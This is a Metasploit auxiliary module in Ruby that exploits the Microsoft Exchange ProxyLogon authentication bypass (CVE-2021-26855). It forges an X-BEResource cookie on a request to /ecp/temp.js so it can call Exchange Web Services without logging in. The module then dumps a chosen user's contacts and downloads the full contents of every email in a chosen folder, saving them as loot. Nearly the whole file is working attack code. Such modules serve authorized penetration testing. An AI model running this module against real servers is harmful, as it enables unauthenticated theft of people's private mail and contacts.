##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# begin auxiliary class
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Exchange ProxyLogon Collector',
        'Description' => %q{
          This module scan for a vulnerability on Microsoft Exchange Server that
          allows an attacker bypassing the authentication and impersonating as the
          admin (CVE-2021-26855).

          By chaining this bug with another post-auth arbitrary-file-write
          vulnerability to get code execution (CVE-2021-27065).

          As a result, an unauthenticated attacker can execute arbitrary commands on
          Microsoft Exchange Server.

          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

          All components are vulnerable by default.
        },
        'Author' => [
          'mekhalleh (RAMELLA Sébastien)' # Module author (Zeop Entreprise)
        ],
        'References' => [
          ['CVE', '2021-26855'],
          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],
          ['URL', 'https://proxylogon.com/'],
          ['URL', 'https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse'],
          ['URL', 'http://aka.ms/exchangevulns']
        ],
        'DisclosureDate' => '2021-03-02',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'AKA' => ['ProxyLogon']
        }
      )
    )

    register_options([
      OptString.new('EMAIL', [true, 'The email account what you want dump']),
      OptString.new('FOLDER', [true, 'The email folder what you want dump', 'inbox']),
      OptString.new('SERVER_NAME', [true, 'The name of secondary internal Exchange server targeted'])
    ])

    register_advanced_options([
      OptInt.new('MaxEntries', [false, 'Override the maximum number of object to dump', 512])
    ])
  end

  XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze

  def grab_contacts
    response = send_xml(soap_findcontacts)
    xml = Nokogiri::XML.parse(response.body)

    data = xml.xpath('//t:Contact', XMLNS)
    if data.empty?
      print_status(' - the user has no contacts')
    else
      write_loot(data.to_s)
    end
  end

  def grab_emails(total_count)
    # get the emails list of the target folder.
    response = send_xml(soap_maillist(total_count))
    xml = Nokogiri::XML.parse(response.body)

    # iteration to download the emails.
    xml.xpath('//t:ItemId', XMLNS).each do |item|
      print_status(" - download item: #{item.values[1]}")
      response = send_xml(soap_download(item.values[0], item.values[1]))
      xml = Nokogiri::XML.parse(response.body)

      message = xml.at_xpath('//t:MimeContent', XMLNS).content
      write_loot(Rex::Text.decode_base64(message))
    end
  end

  def send_xml(data)
    uri = normalize_uri('ecp', 'temp.js')

    received = send_request_cgi(
      'method' => 'POST',
      'uri' => uri,
      'cookie' => "X-BEResource=#{datastore['SERVER_NAME']}/EWS/Exchange.asmx?a=~3;",
      'ctype' => 'text/xml; charset=utf-8',
      'data' => data
    )
    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received

    received
  end

  def soap_download(id, change_key)
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetItem>
            <m:ItemShape>
              <t:BaseShape>IdOnly</t:BaseShape>
              <t:IncludeMimeContent>true</t:IncludeMimeContent>
            </m:ItemShape>
            <m:ItemIds>
              <t:ItemId Id="#{id}" ChangeKey="#{change_key}" />
            </m:ItemIds>
          </m:GetItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_findcontacts
    <<~SOAP
      <?xml version='1.0' encoding='utf-8'?>
      <soap:Envelope
      xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'
      xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'
      xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'
      xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
        <soap:Body>
          <m:FindItem Traversal='Shallow'>
            <m:ItemShape>
              <t:BaseShape>AllProperties</t:BaseShape>
            </m:ItemShape>
            <m:IndexedPageItemView MaxEntriesReturned="#{datastore['MaxEntries']}" Offset="0" BasePoint="Beginning" />
            <m:ParentFolderIds>
              <t:DistinguishedFolderId Id='contacts'>
                <t:Mailbox>
                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>
                </t:Mailbox>
              </t:DistinguishedFolderId>
            </m:ParentFolderIds>
          </m:FindItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_mailnum
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetFolder>
            <m:FolderShape>
              <t:BaseShape>Default</t:BaseShape>
            </m:FolderShape>
            <m:FolderIds>
              <t:DistinguishedFolderId Id="#{datastore['FOLDER']}">
                <t:Mailbox>
                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>
                </t:Mailbox>
              </t:DistinguishedFolderId>
            </m:FolderIds>
          </m:GetFolder>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_maillist(max_entries)
    <<~SOAP
      <?xml version='1.0' encoding='utf-8'?>
      <soap:Envelope
      xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'
      xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'
      xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'
      xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
        <soap:Body>
          <m:FindItem Traversal='Shallow'>
            <m:ItemShape>
              <t:BaseShape>AllProperties</t:BaseShape>
            </m:ItemShape>
            <m:IndexedPageItemView MaxEntriesReturned="#{max_entries}" Offset="0" BasePoint="Beginning" />
            <m:ParentFolderIds>
              <t:DistinguishedFolderId Id='#{datastore['FOLDER']}'>
                <t:Mailbox>
                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>
                </t:Mailbox>
              </t:DistinguishedFolderId>
            </m:ParentFolderIds>
          </m:FindItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def write_loot(data)
    loot_path = store_loot('', 'text/plain', datastore['RHOSTS'], data, '', '')
    print_good(" - file saved to #{loot_path}")
  end

  def run
    # get the informations about the targeted user account.
    response = send_xml(soap_mailnum)
    if response.body =~ /Success/
      print_status('Connection to the server is successful')
      print_status(" - selected account: #{datastore['EMAIL']}\n")

      # grab contacts.
      print_status('Attempt to dump contacts list for this user')
      grab_contacts

      print_line

      # grab emails.
      print_status('Attempt to dump emails for this user')
      xml = Nokogiri::XML.parse(response.body)
      folder_id = xml.at_xpath('//t:FolderId', XMLNS).values
      print_status(" - selected folder: #{datastore['FOLDER']} (#{folder_id[0]})")

      total_count = xml.at_xpath('//t:TotalCount', XMLNS).content
      print_status(" - number of email found: #{total_count}")

      if total_count.to_i > datastore['MaxEntries']
        print_warning(" - number of email recaluled due to max entries: #{datastore['MaxEntries']}")
        total_count = datastore['MaxEntries'].to_s
      end
      grab_emails(total_count)
    end
  end

end
